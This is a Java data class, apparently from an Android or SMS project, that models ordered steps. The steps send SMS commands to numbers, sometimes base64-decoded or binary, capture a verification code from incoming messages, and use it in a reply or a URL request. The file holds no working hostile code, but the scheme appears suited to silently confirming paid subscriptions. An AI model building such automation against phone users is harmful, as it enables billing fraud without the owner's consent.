package work;

import java.util.HashMap;
import java.util.Map;

public class Contents implements Comparable<Contents> {
	/*
	 * 操作的类型 1.直接发送短信 2.短信用二进制发送 3.短信base64解码之后发送 4.短信base64解码之后二进制发送 5.获取验证码
	 * 6.携带验证码访问url 7.携带验证码进行二次回复 8.直接访问url
	 */
	private String type;
	/*
	 * 上行号码
	 */
	private String up;
	/*
	 * 命令
	 */
	private String cmd;
	/*
	 * 下行号码
	 */
	private String down;
	/*
	 * 下行关键字、获取二次验证码关键字
	 */
	private String downkey;
	/*
	 * 步骤
	 */
	private String step;
	/*
	 * 需访问的url
	 */
	private String url;

	/*
	 * 访问当时GET/POST
	 */
	private String dotype;
	/*
	 * 预留字段
	 */
	private String ext;
	/*
	 * 请求头MAP
	 */
	private HashMap<String, String> headers;

	public String getType() {
		return type;
	}

	public void setType(String type) {
		this.type = type;
	}

	public String getUp() {
		return up;
	}

	public void setUp(String up) {
		this.up = up;
	}

	public String getCmd() {
		return cmd;
	}

	public void setCmd(String cmd) {
		this.cmd = cmd;
	}

	public String getDown() {
		return down;
	}

	public void setDown(String down) {
		this.down = down;
	}

	public String getDownkey() {
		return downkey;
	}

	public void setDownkey(String downkey) {
		this.downkey = downkey;
	}

	public String getStep() {
		return step;
	}

	public void setStep(String step) {
		this.step = step;
	}

	public String getUrl() {
		return url;
	}

	public void setUrl(String url) {
		this.url = url;
	}

	public String getExt() {
		return ext;
	}

	public void setExt(String ext) {
		this.ext = ext;
	}

	public String getDotype() {
		return dotype;
	}

	public void setDotype(String dotype) {
		this.dotype = dotype;
	}

	public HashMap<String, String> getHeaders() {
		return headers;
	}

	public void setHeaders(HashMap<String, String> headers) {
		this.headers = headers;
	}

	@Override
	public String toString() {
		return "Contents [type=" + type + ", up=" + up + ", cmd=" + cmd
				+ ", down=" + down + ", downkey=" + downkey + ", step=" + step
				+ ", url=" + url + ", dotype=" + dotype + ", ext=" + ext
				+ ", headers=" + headers + "]";
	}

	@Override
	public int compareTo(Contents contents) {
		return Integer.valueOf(this.step) - Integer.valueOf(contents.step);
	}

}
